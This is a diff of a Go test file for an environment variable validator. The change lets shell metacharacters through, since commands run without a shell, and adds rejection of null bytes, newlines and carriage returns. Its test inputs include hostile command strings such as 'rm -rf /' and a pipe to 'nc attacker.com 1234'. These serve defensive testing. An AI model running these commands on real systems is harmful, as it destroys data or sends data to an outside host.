@@ -8,8 +8,12 @@ import (
 	"github.com/stretchr/testify/require"
 )
 
-// TestEnvironmentVariableInjection_CommandInjection tests that dangerous
-// patterns in environment variable values are detected by security validator
+// TestEnvironmentVariableInjection_CommandInjection tests the environment variable value
+// validation behavior (AC-M4-2, AC-M4-3).
+//
+// Commands are executed directly (not via a shell), so shell meta-characters such as
+// ; | $( > < carry no injection risk. Only control characters (\0, \n, \r) are rejected
+// because they can corrupt structured output or inject headers.
 func TestEnvironmentVariableInjection_CommandInjection(t *testing.T) {
 	tests := []struct {
 		name     string
@@ -18,82 +22,106 @@ func TestEnvironmentVariableInjection_CommandInjection(t *testing.T) {
 		wantErr  bool
 		reason   string
 	}{
+		// Shell meta-characters: allowed because no shell is involved
 		{
 			name:     "Value with command separator",
 			envKey:   "MY_VAR",
 			envValue: "normal; rm -rf /",
-			wantErr:  true,
-			reason:   "Semicolon can separate commands",
+			wantErr:  false,
+			reason:   "Semicolon is harmless when command runs without a shell",
 		},
 		{
 			name:     "Value with pipe",
 			envKey:   "MY_VAR",
 			envValue: "data | nc attacker.com 1234",
-			wantErr:  true,
-			reason:   "Pipe can redirect output to commands",
+			wantErr:  false,
+			reason:   "Pipe is harmless when command runs without a shell",
 		},
 		{
 			name:     "Value with command substitution",
 			envKey:   "MY_VAR",
 			envValue: "prefix$(malicious_command)",
-			wantErr:  true,
-			reason:   "Command substitution allows code execution",
+			wantErr:  false,
+			reason:   "Command substitution syntax is harmless when no shell is invoked",
 		},
 		{
 			name:     "Value with backticks",
 			envKey:   "MY_VAR",
 			envValue: "prefix`malicious_command`",
-			wantErr:  true,
-			reason:   "Backticks allow command substitution",
+			wantErr:  false,
+			reason:   "Backtick substitution syntax is harmless when no shell is invoked",
 		},
 		{
 			name:     "Value with && operator",
 			envKey:   "MY_VAR",
 			envValue: "normal && malicious",
-			wantErr:  true,
-			reason:   "AND operator can chain commands",
+			wantErr:  false,
+			reason:   "AND operator is harmless when command runs without a shell",
 		},
 		{
 			name:     "Value with || operator",
 			envKey:   "MY_VAR",
 			envValue: "normal || malicious",
-			wantErr:  true,
-			reason:   "OR operator can chain commands",
+			wantErr:  false,
+			reason:   "OR operator is harmless when command runs without a shell",
 		},
 		{
 			name:     "Value with redirect",
 			envKey:   "MY_VAR",
 			envValue: "data > /tmp/output",
-			wantErr:  true,
-			reason:   "Redirect can write to arbitrary files",
+			wantErr:  false,
+			reason:   "Redirect is harmless when command runs without a shell",
 		},
 		{
-			name:     "Value with rm command",
+			name:     "Value with rm command text",
 			envKey:   "MY_VAR",
 			envValue: "prefix rm -rf /tmp",
-			wantErr:  true,
-			reason:   "rm command can delete files",
+			wantErr:  false,
+			reason:   "Text containing 'rm' is harmless as a variable value",
 		},
+		// Control characters: rejected (can corrupt structured output / inject headers)
+		{
+			name:     "Value with null byte",
+			envKey:   "MY_VAR",
+			envValue: "value\x00suffix",
+			wantErr:  true,
+			reason:   "Null byte can truncate strings and corrupt structured output",
+		},
+		{
+			name:     "Value with newline",
+			envKey:   "MY_VAR",
+			envValue: "value\nsuffix",
+			wantErr:  true,
+			reason:   "Newline can inject additional log lines or headers",
+		},
+		{
+			name:     "Value with carriage return",
+			envKey:   "MY_VAR",
+			envValue: "value\rsuffix",
+			wantErr:  true,
+			reason:   "Carriage return can corrupt structured output",
+		},
+		// Safe values
 		{
 			name:     "Safe library path",
 			envKey:   "LD_PRELOAD",
 			envValue: "/usr/lib/libtest.so",
 			wantErr:  false,
-			reason:   "Simple path without dangerous patterns is accepted",
+			reason:   "Simple path is accepted",
 		},
 		{
 			name:     "Safe PATH value",
 			envKey:   "PATH",
 			envValue: "/usr/local/bin:/usr/bin:/bin",
 			wantErr:  false,
-			reason:   "Standard PATH without dangerous patterns",
+			reason:   "Standard PATH is accepted",
 		},
 		{
 			name:     "Safe HOME value",
 			envKey:   "HOME",
 			envValue: "/home/testuser",
 			wantErr:  false,
-			reason:   "Simple directory path",
+			reason:   "Simple directory path is accepted",
 		},
 	}
 
@@ -107,10 +135,10 @@ func TestEnvironmentVariableInjection_CommandInjection(t *testing.T) {
 			err = validator.ValidateEnvironmentValue(tt.envKey, tt.envValue)
 
 			if tt.wantErr {
-				require.Error(t, err, "Validation should reject %s=%s: %s",
+				require.Error(t, err, "Validation should reject %s=%q: %s",
 					tt.envKey, tt.envValue, tt.reason)
 			} else {
-				require.NoError(t, err, "Validation should accept %s=%s: %s",
+				require.NoError(t, err, "Validation should accept %s=%q: %s",
 					tt.envKey, tt.envValue, tt.reason)
 			}
 		})
@@ -151,7 +179,8 @@ func TestEnvironmentVariableInjection_SafeValues(t *testing.T) {
 }
 
 // TestEnvironmentVariableInjection_AllEnvironmentVars tests validation of
-// a complete environment variable set with command injection patterns
+// a complete environment variable set. Shell meta-chars are allowed; only
+// control characters (\0, \n, \r) cause rejection.
 func TestEnvironmentVariableInjection_AllEnvironmentVars(t *testing.T) {
 	validator, err := security.NewValidator(nil)
 	require.NoError(t, err)
@@ -173,32 +202,39 @@ func TestEnvironmentVariableInjection_AllEnvironmentVars(t *testing.T) {
 			reason:  "All variables have safe values",
 		},
 		{
-			name: "Environment with command injection in PATH",
+			name: "Environment with shell metachar in PATH",
 			envVars: map[string]string{
 				"HOME": "/home/user",
 				"PATH": "/usr/bin; rm -rf /",
 				"USER": "testuser",
 			},
-			wantErr: true,
-			reason:  "PATH contains command separator",
+			wantErr: false,
+			reason:  "Shell metachar in PATH is allowed (no shell involved in execution)",
 		},
 		{
-			name: "Environment with command substitution",
+			name: "Environment with command substitution syntax",
 			envVars: map[string]string{
 				"HOME":   "/home/user",
 				"CONFIG": "normal$(malicious)",
 			},
-			wantErr: true,
-			reason:  "CONFIG contains command substitution",
+			wantErr: false,
+			reason:  "Command substitution syntax is harmless without a shell",
 		},
 		{
-			name: "Environment with multiple dangerous patterns",
+			name: "Environment with null byte",
 			envVars: map[string]string{
-				"VAR1": "data | nc attacker.com",
-				"VAR2": "prefix && malicious",
+				"VAR1": "data\x00null",
 			},
 			wantErr: true,
-			reason:  "Multiple variables contain dangerous patterns",
+			reason:  "Null byte is rejected",
+		},
+		{
+			name: "Environment with newline injection",
+			envVars: map[string]string{
+				"VAR1": "line1\ninjected",
+			},
+			wantErr: true,
+			reason:  "Newline is rejected",
 		},
 	}
 
